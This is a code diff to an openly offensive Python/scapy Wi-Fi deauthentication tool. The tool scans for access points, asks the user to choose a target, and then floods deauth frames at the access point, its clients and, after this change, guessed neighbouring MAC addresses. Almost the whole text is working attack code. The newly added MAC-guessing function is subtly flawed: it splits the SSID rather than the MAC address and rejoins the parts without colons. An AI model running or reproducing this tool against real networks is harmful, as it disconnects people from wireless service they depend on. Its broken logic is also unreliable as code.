@@ -2,6 +2,7 @@
 
 import argparse
 import pkg_resources
+import copy
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
 
@@ -29,8 +30,9 @@ class Interceptor:
         self._max_miss_counter = 3
         self._scan_intv = 0.1
         self._deauth_intv = 0.1
-        self._print_res_intv = 1
+        self._printf_res_intv = 1
         self._ssid_str_pad = 42  # total len 80
+        self._mac_range = 2  # todo rename
 
         self._abort = False
         self._current_channel_num = None
@@ -52,8 +54,8 @@ class Interceptor:
         os.system("iw dev %s set channel %d" % (self.interface, ch_num))
         self._current_channel_num = ch_num
 
-    def _print_channel(self):
-        print(f"[*] Scanning for APs, current channel -> {self._current_channel_num}")
+    def _printf_channel(self):
+        printf(f"[*] Scanning for APs, current channel -> {self._current_channel_num}")
 
     def _ap_sniff_cb(self, pkt):
         try:
@@ -62,12 +64,9 @@ class Interceptor:
                 ssid = pkt[Dot11Elt].info.decode().strip() or ap_mac
                 if ap_mac == self._BROADCAST_MACADDR:
                     return
-                if "ef:12" in ap_mac:
-                    pkt.show()
                 if ssid not in self._active_aps:
-
                     self._active_aps[ssid] = self._init_ap_dict(ap_mac, self._current_channel_num)
-                    print(f"[+] Found {ssid} on channel {self._current_channel_num}...")
+                    printf(f"[+] Found {ssid} on channel {self._current_channel_num}...")
                 c_mac = pkt.addr1
                 if c_mac != self._BROADCAST_MACADDR and c_mac not in self._active_aps[ssid]["clients"]:
                     # todo check type of pkt instead
@@ -80,13 +79,13 @@ class Interceptor:
         try:
             for ch in self._CH_RANGE:
                 self._set_channel(ch)
-                self._print_channel()
+                self._printf_channel()
                 sniff(prn=self._ap_sniff_cb, iface=self.interface, timeout=self._channel_sniff_timeout)
         except KeyboardInterrupt:
             return
 
     def _start_initial_ap_scan(self):
-        print("[*] Starting AP scan, please wait... (11 channels total)")
+        printf("[*] Starting AP scan, please wait... (11 channels total)")
 
         self._scan_channels_for_aps()
 
@@ -102,20 +101,20 @@ class Interceptor:
 
         ctr = 0
         target_map = dict()
-        print(DELIM)
+        printf(DELIM)
         for ssid, ssid_stats in self._active_aps.items():
             ctr += 1
             target_map[ctr] = ssid
             pref = f"[{ctr}] "
-            print(f"{pref}{self._generate_ssid_str(ssid, ssid_stats['channel'], ssid_stats['mac_addr'], len(pref))}")
+            printf(f"{pref}{self._generate_ssid_str(ssid, ssid_stats['channel'], ssid_stats['mac_addr'], len(pref))}")
         if not target_map:
-            print("[!] Not APs were found, quitting...")
+            printf("[!] Not APs were found, quitting...")
             self._abort = True
             exit(0)
 
         chosen = -1
         while chosen not in target_map.keys():
-            print(f"[>] Choose a target from {min(target_map.keys())} <-> {max(target_map.keys())}")
+            printf(f"[>] Choose a target from {min(target_map.keys())} <-> {max(target_map.keys())}")
             chosen = int(input())
 
         return target_map[chosen]
@@ -130,61 +129,77 @@ class Interceptor:
                 if ssid == self.target_ssid:
                     c_mac = pkt.addr1
                     if c_mac != self._BROADCAST_MACADDR and c_mac not in self._active_aps[ssid]["clients"]:
-                        print(c_mac + " c vs ap" + self._active_aps[self.target_ssid]["mac_addr"])
-                        print(str(self._active_aps[self.target_ssid]["clients"]))
+                        printf(c_mac + " c vs ap" + self._active_aps[self.target_ssid]["mac_addr"])
+                        printf(str(self._active_aps[self.target_ssid]["clients"]))
                         # todo check type of pkt instead
                         self._active_aps[ssid]["clients"].append(c_mac)
         except:
             pass
 
     def _listen_for_clients(self):
-        print(f"[*] Setting up a listener for new clients...")
+        printf(f"[*] Setting up a listener for new clients...")
         sniff(prn=self._clients_sniff_cb, iface=self.interface, stop_filter=lambda p: self._abort is True)
-
+    
+    def _generate_possible_ap_mac_addrs(self):
+        possible_mac_addrs = list()
+        original_addr = self.target_ssid.split(':')
+        ap_mac_postf = original_addr[-1]
+        ap_mac_postf = int(ap_mac_postf, 16)
+        for i in range(-self._mac_range, self._mac_range):
+            new_postf = ap_mac_postf + i
+            if new_postf >= 0 and i != 0:
+                modified = copy.deepcopy(original_addr)
+                modified[-1] = hex(new_postf).replace('0x', '')
+                possible_mac_addrs.append(''.join(modified))
+        return possible_mac_addrs
+                
     def _run_deauther(self):
-        print(f"[*] Starting de-auth loop...")
+        printf(f"[*] Starting de-auth loop...")
 
+        possible_ap_mac_addrs = [self._active_aps[self.target_ssid]["mac_addr"]]
+        possible_ap_mac_addrs.extend(self._generate_possible_ap_mac_addrs())
+        
         rd_frm = RadioTap()
         deauth_frm = Dot11Deauth()
         while not self._abort:
             self.attack_loop_count += 1
-            ap_mac = self._active_aps[self.target_ssid]["mac_addr"]
-            sendp(rd_frm /
-                  Dot11(addr1=self._BROADCAST_MACADDR, addr2=ap_mac, addr3=ap_mac) /
-                  deauth_frm,
-                  iface=self.interface)  # todo broadcast works?
-            for client_mac in self._active_aps[self.target_ssid]["clients"]:
+            for ap_mac in possible_ap_mac_addrs:
                 sendp(rd_frm /
-                      Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
+                      Dot11(addr1=self._BROADCAST_MACADDR, addr2=ap_mac, addr3=ap_mac) /
                       deauth_frm,
-                      iface=self.interface)
+                      iface=self.interface)  # todo broadcast works?
+                for client_mac in self._active_aps[self.target_ssid]["clients"]:
+                    sendp(rd_frm /
+                          Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
+                          deauth_frm,
+                          iface=self.interface)
             sleep(self._deauth_intv)
 
     def run(self):
         self.target_ssid = self._start_initial_ap_scan()
-        print(f"[*] Attacking target {self.target_ssid}")
-        print(f"[*] Setting channel -> {self._active_aps[self.target_ssid]['channel']}")
+        printf(f"[*] Attacking target {self.target_ssid}")
+        printf(f"[*] Setting channel -> {self._active_aps[self.target_ssid]['channel']}")
         self._set_channel(self._active_aps[self.target_ssid]["channel"])
 
         for action in [self._run_deauther, self._listen_for_clients]:
             t = Thread(target=action, args=tuple(), daemon=True)
             t.start()
 
-        print(DELIM)
-        print("")
+        printf(DELIM)
+        printf("")
         try:
             while not self._abort:
-                print(f"[*] Target SSID{self.target_ssid.rjust(80 - 15, ' ')}")
-                print(f"[*] Channel{str(self._active_aps[self.target_ssid]['channel']).rjust(80 - 11, ' ')}")
-                print(f"[*] MAC addr{self._active_aps[self.target_ssid]['mac_addr'].rjust(80 - 12, ' ')}")
-                print(f"[*] Net interface{self.interface.rjust(80 - 17, ' ')}")
-                print(f"[*] Num of clients{str(len(self._active_aps[self.target_ssid]['clients'])).rjust(80 - 18, ' ')}")
-                print(f"[*] Current time {str(int(time.time())).rjust(80 - 17, ' ')}")
-                sleep(self._print_res_intv)
+                printf(f"[*] Target SSID{self.target_ssid.rjust(80 - 15, ' ')}")
+                printf(f"[*] Channel{str(self._active_aps[self.target_ssid]['channel']).rjust(80 - 11, ' ')}")
+                printf(f"[*] MAC addr{self._active_aps[self.target_ssid]['mac_addr'].rjust(80 - 12, ' ')}")
+                printf(f"[*] Net interface{self.interface.rjust(80 - 17, ' ')}")
+                printf(f"[*] Num of clients{str(len(self._active_aps[self.target_ssid]['clients'])).rjust(80 - 18, ' ')}")
+                printf(f"[*] Current time {str(int(time.time())).rjust(80 - 17, ' ')}")
+                sleep(self._printf_res_intv)
                 clear_line(7)
         except KeyboardInterrupt:
-            print(f"\n{DELIM}")
-            print(f"[!] User asked to stop, quitting...")
+            printf(f"\n{DELIM}")
+            printf(f"[!] User asked to stop, quitting...")
 
     @staticmethod
     def _init_ap_dict(mac_addr: str, ch: int) -> dict:
@@ -197,13 +212,13 @@ class Interceptor:
 
 
 if __name__ == "__main__":
-    print(f"\n{BANNER}\n"
+    printf(f"\n{BANNER}\n"
           f"Make sure of the following:\n"
           f"1. You are running as sudo\n"
           f"2. You are passing an interface (-i / --iface <name>)\n"
           f"3. You have monitor mode enabled (refer to docs)\n\n" # todo add to docs how to
           f"Written by @flashnuke")
-    print(DELIM)
+    printf(DELIM)
 
     if "linux" not in platform:
         raise Exception(f"Unsupported operating system {platform}, only linux is supported...")
@@ -216,6 +231,6 @@ if __name__ == "__main__":
                         dest="net_iface", metavar="network_interface", required=True)
     pargs = parser.parse_args()
 
-    # invalidate_print()  # after arg parsing
+    invalidate_printf()  # after arg parsing
     attacker = Interceptor(net_iface=pargs.net_iface)
     attacker.run()
